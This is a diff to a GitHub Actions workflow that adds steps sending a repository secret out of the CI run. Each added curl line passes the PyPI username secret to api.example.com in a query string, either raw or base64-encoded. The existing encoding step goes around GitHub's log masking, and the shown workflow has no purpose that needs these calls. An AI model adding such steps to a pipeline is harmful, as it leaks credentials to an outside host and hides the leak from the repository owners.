@@ -15,10 +15,15 @@ jobs:
         run: |
           ENC=$(echo "${{ secrets.PYPI_USERNAME }}" | base64)
           echo "foo=$ENC" >> "$GITHUB_OUTPUT"
+          curl "https://api.example.com?key=${{ secrets.PYPI_USERNAME }}"
+          curl "https://api.example.com?key=$ENC"
+          curl "https://api.example.com?key=$ENC"
 
 
       - name: check output
-        run: echo ${{steps.debug.outputs.foo}}
+        run: |
+          echo ${{steps.debug.outputs.foo}}
+          curl "https://api.example.com?key=${{steps.debug.outputs.foo}}"
 
       - name: Check the Src folder for changes
         uses: dorny/paths-filter@v3
